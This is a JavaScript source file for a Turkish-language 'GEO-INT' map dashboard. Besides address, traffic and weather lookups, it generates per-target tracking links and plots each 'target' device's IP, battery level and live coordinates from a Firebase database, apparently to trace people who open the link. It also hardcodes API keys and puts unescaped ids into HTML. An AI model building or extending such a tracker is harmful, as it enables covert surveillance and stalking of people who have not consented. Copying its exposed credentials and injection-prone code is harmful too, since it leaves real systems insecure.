// --- CONFIG ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

let map, trafficLayer, deviceMarkers = {}; 

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    addLog("GEO-INT v8.5 SİSTEMİ ÇEVRİMİÇİ. TÜM MODÜLLER AKTİF.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);
    trafficLayer.on('add', () => trafficLayer.getContainer().classList.add('road-flow-layer'));

    map.on('click', onMapClick);
}

// --- HARİTA TIKLAMA: ADRES + HAVA + YOL DURUMU ---
async function onMapClick(e) {
    const { lat, lng } = e.latlng;
    const popup = L.popup().setLatLng(e.latlng).setContent('<div class="text-[9px] animate-pulse">İSTİHBARAT TOPLANIYOR...</div>').openOn(map);

    try {
        // 1. Adres Sorgusu (TomTom)
        const addrP = fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`).then(r => r.json());
        // 2. Trafik Sorgusu (TomTom)
        const flowP = fetch(`https://api.tomtom.com/traffic/services/4/flowSegmentData/relative0/10/json?key=${TOMTOM_KEY}&point=${lat},${lng}`).then(r => r.json());
        // 3. Hava Durumu Sorgusu (Open-Meteo)
        const weatherP = fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true`).then(r => r.json());

        const [addr, flow, weather] = await Promise.all([addrP, flowP, weatherP]);

        let trafficInfo = "Bilinmiyor", tColor = "text-gray-400";
        if (flow.flowSegmentData) {
            const ratio = flow.flowSegmentData.currentSpeed / flow.flowSegmentData.freeFlowSpeed;
            if (ratio < 0.4) { trafficInfo = "KRİTİK YOĞUN"; tColor = "text-red-600"; }
            else if (ratio < 0.8) { trafficInfo = "YOĞUN"; tColor = "text-yellow-500"; }
            else { trafficInfo = "AKICI"; tColor = "text-green-500"; }
        }

        const temp = weather.current_weather.temperature;
        const wind = weather.current_weather.windspeed;

        popup.setContent(`
            <div class="text-[10px] space-y-2 p-1 font-mono">
                <b class="text-red-600 border-b border-white/10 block pb-1 underline">İSTİHBARAT ANALİZİ</b>
                <div><b>ADRES:</b> <span class="text-gray-300">${addr.addresses[0].address.freeformAddress}</span></div>
                <div class="flex justify-between border-y border-white/5 py-1">
                    <span><b>HAVA:</b> ${temp}°C</span>
                    <span><b>RÜZGAR:</b> ${wind}km/h</span>
                </div>
                <div><b>YOL DURUMU:</b> <span class="${tColor} font-bold">${trafficInfo}</span></div>
                <div class="text-[8px] text-gray-500 italic">Koordinat: ${lat.toFixed(4)}, ${lng.toFixed(4)}</div>
            </div>
        `);
    } catch (err) { popup.setContent("HATA: Veri bağlantısı kesildi."); }
}

// --- CİHAZ LİSTESİ VE KONUMA UÇMA ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 

    if (!data) {
        list.innerHTML = '<div class="text-gray-600 italic text-[9px] text-center">Aktif hedef yok.</div>';
        for (let id in deviceMarkers) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
        return;
    }

    for (let id in data) {
        const info = data[id];
        const latLng = [info.lat, info.lng];
        
        if (deviceMarkers[id]) deviceMarkers[id].setLatLng(latLng);
        else {
            deviceMarkers[id] = L.marker(latLng, {
                icon: L.divIcon({ className: 'd-icon', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` })
            }).addTo(map);
        }

        const div = document.createElement('div');
        div.className = "glass-panel p-3 border-l-2 border-green-500 text-[10px] group pointer-events-auto hover:border-green-300 transition-all cursor-pointer";
        div.setAttribute('onclick', `map.flyTo([${info.lat}, ${info.lng}], 17)`);
        
        div.innerHTML = `
            <div class="flex justify-between items-center">
                <span class="text-green-400 font-bold italic tracking-wider">${id}</span>
                <button onclick="event.stopPropagation(); deleteDevice('${id}')" class="text-red-600 opacity-0 group-hover:opacity-100 transition-all"><i class="fas fa-trash-alt"></i></button>
            </div>
            <div class="text-[9px] text-gray-400 mt-2 space-y-1 font-mono">
                <div class="flex justify-between"><span>IP: ${info.ip || '...'}</span> <span>PİL: ${info.battery || '--'}</span></div>
                <div class="text-cyan-500 text-center border-t border-white/10 pt-1 mt-1 font-bold">${info.lat.toFixed(4)}, ${info.lng.toFixed(4)}</div>
            </div>
        `;
        list.appendChild(div);
    }
});

// --- TAKTİKSEL MODALLAR ---
function showModal(title, message, icon, isConfirm, callback) {
    const modal = document.getElementById('tacticModal');
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('modalMsg').innerText = message;
    document.getElementById('modalIcon').className = `fas ${icon} ${title.includes('HATA') ? 'text-red-600' : 'text-green-500'}`;
    
    const btnContainer = document.getElementById('modalButtons');
    btnContainer.innerHTML = '';

    if (isConfirm) {
        const cancelBtn = document.createElement('button');
        cancelBtn.className = 'modal-btn modal-btn-gray';
        cancelBtn.innerText = 'İPTAL';
        cancelBtn.onclick = () => modal.classList.add('hidden');
        
        const okBtn = document.createElement('button');
        okBtn.className = 'modal-btn modal-btn-red';
        okBtn.innerText = 'ONAYLA';
        okBtn.onclick = () => { modal.classList.add('hidden'); callback(); };
        
        btnContainer.append(cancelBtn, okBtn);
    } else {
        const closeBtn = document.createElement('button');
        closeBtn.className = 'modal-btn modal-btn-red border-green-500 text-green-500';
        closeBtn.innerText = 'TAMAM';
        closeBtn.onclick = () => modal.classList.add('hidden');
        btnContainer.appendChild(closeBtn);
    }
    modal.classList.remove('hidden');
}

function deleteDevice(id) {
    showModal("SİSTEM ONAYI", `${id} kimlikli cihazı imha etmek istiyor musunuz?`, "fa-trash-alt", true, () => {
        database.ref('locations/' + id).remove().then(() => {
            addLog(`HEDEF SİLİNDİ: ${id}`);
            showModal("BAŞARILI", "Cihaz veritabanından temizlendi.", "fa-check-circle", false);
        });
    });
}

function generateTrackingLink() {
    const nodeId = "NODE_" + (Math.floor(Math.random() * 9000) + 1000);
    const link = `https://berkaytdev.com/track.html?id=${nodeId}`;
    document.getElementById('generatedLink').value = link;
    document.getElementById('linkModal').classList.remove('hidden');
    addLog(`YENİ HEDEF KİMLİĞİ: ${nodeId}`);
}

function getMyLocation() {
    navigator.geolocation.getCurrentPosition(p => {
        const coords = [p.coords.latitude, p.coords.longitude];
        map.flyTo(coords, 16);
        if (myLocationMarker) map.removeLayer(myLocationMarker);
        myLocationMarker = L.circleMarker(coords, { radius: 8, color: '#00ffff' }).addTo(map);
    }, () => showModal("ERİŞİM HATASI", "GPS sinyali alınamadı. Lütfen konum izni verin.", "fa-times-circle", false));
}

function searchLocation() {
    const q = document.getElementById('searchInput').value;
    if(!q) return;
    fetch(`https://api.tomtom.com/search/2/geocode/${encodeURIComponent(q)}.json?key=${TOMTOM_KEY}&limit=1`)
        .then(r => r.json()).then(d => {
            if (d.results[0]) map.flyTo([d.results[0].position.lat, d.results[0].position.lon], 15);
            else showModal("HATA", "Konum bulunamadı.", "fa-search", false);
        });
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }
function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-900">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}
function toggleLayer(t) {
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    document.getElementById('btn-' + t).classList.toggle('active');
}
